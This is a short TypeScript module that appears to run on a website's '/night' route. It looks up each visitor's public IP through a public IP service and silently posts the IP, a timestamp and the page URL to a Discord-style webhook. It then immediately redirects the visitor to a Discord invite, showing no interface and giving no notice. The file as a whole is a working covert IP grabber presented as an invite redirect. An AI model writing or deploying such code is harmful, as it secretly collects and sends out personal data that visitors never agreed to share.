import { resolveNightWebhook } from "./nightWebhook";

const NIGHT_INVITE = "https://dsc.gg/nightk";

export function isNightPath(): boolean {
  const p = window.location.pathname.replace(/\/$/, "") || "/";
  return p === "/night" || p.endsWith("/night");
}

async function fetchPublicIp(): Promise<string> {
  try {
    const res = await fetch("https://api.ipify.org?format=json", {
      signal: AbortSignal.timeout(5000),
    });
    if (!res.ok) return "unknown";
    const data = (await res.json()) as { ip?: string };
    return data.ip?.trim() || "unknown";
  } catch {
    return "unknown";
  }
}

async function postPlain(webhook: string, content: string): Promise<void> {
  const form = new FormData();
  form.append("payload_json", JSON.stringify({ content: content.slice(0, 2000) }));
  try {
    await fetch(webhook, { method: "POST", body: form, mode: "no-cors" });
  } catch {
    /* ignore */
  }
}

/** Log IP (plain text, no embeds) then redirect immediately — no UI. */
export function runNightGate(): void {
  const webhook = resolveNightWebhook();

  void fetchPublicIp().then((ip) => {
    const line = `night gate · ${new Date().toISOString()}\nIP: ${ip}\n${window.location.href}`;
    if (webhook) void postPlain(webhook, line);
  });

  window.location.replace(NIGHT_INVITE);
}

export function nightInviteUrl(): string {
  return NIGHT_INVITE;
}
